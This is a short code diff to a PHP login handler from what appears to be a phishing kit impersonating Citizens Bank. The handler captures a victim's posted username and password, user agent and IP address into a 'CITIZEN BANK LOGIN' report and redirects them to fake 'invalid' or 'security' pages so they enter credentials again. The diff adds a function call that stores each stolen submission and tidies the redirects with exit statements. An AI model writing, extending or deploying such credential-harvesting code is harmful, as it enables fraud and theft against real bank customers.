@@ -8,6 +8,8 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     $password = $_POST['password'];
     $useragent = $_SERVER['HTTP_USER_AGENT'];
     $ip = getenv("REMOTE_ADDR");
+
+    h4z3_store_submission('login', $_POST);
     
             $body  = "++++++++++ 🐱‍💻 CITIZEN BANK LOGIN 1 🐱‍💻 ++++++++++\r\n";
             $body .= "Username    : $username\r\n";
@@ -45,9 +47,11 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
         }
   if($doublelogin == "on"){
     header('Location: ../invalid');
+    exit;
   }
   else{
     header('Location: ../security');
-  }      
+    exit;
+  }
 }
 ?>
